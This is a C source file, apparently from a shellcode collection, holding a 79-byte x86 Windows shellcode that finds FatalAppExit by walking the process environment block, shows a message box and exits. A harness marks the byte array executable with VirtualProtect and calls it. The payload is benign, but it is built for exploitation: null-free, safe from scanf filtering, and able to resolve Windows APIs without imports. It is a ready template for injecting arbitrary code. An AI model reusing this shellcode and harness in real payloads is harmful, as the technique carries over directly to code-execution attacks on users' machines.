// ***************************************************************************************************
// * Shellcode by Moustafa Saleh         (msaleh83@gmail.com)                                        *
// * Size:       79 bytes                                                                            *
// * Function:   Displays a message box without using USER32.dll and exits (calls FatalAppExit() )   *
// * Notes:      null free, fscanf/scanf/sscanf safe (0x09, 0x0A, 0x0B, 0x0C, 0x0D and 0x20 free)    *
// *             Based on shellcode by Berend-Jan Wever & Peter Ferrie   @                           *
// *             http://code.google.com/p/win-exec-calc-shellcode/                                   *
// ***************************************************************************************************

#include<windows.h>
#include<stdio.h>

unsigned char shell[79] = {
    0x33, 0xD2, 0x52, 0x68, 0x4D, 0x30, 0x53, 0x41, 0x54, 0x52, 0x64, 0x8B,
    0x72, 0x30, 0xB2, 0x21, 0x4A, 0x8B, 0x74, 0x32, 0xEC, 0x8B, 0x74, 0x32,
    0xEC, 0xAD, 0x8B, 0x30, 0x8B, 0x7E, 0x18, 0x8B, 0x5F, 0x3C, 0x8B, 0x5C,
    0x3B, 0x78, 0x03, 0xD3, 0x8B, 0x34, 0x3A, 0x03, 0xF7, 0x8B, 0x4C, 0x3B,
    0x24, 0x03, 0xCF, 0x33, 0xD2, 0x0F, 0xB7, 0x2C, 0x51, 0x42, 0xAD, 0x81,
    0x3C, 0x38, 0x46, 0x61, 0x74, 0x61, 0x75, 0xF1, 0x8B, 0x74, 0x3B, 0x1C,
    0x03, 0xF7, 0x03, 0x3C, 0xAE, 0xFF, 0xD7
};

int main(int argc, char **argv)
{
    int (*f)();
    int OldProtect;
    f = (int (*)()) shell;
    
    VirtualProtect( (LPVOID) f, sizeof(shell)+4, PAGE_EXECUTE, (PDWORD) &OldProtect );
    
    (int)(*f)();
}

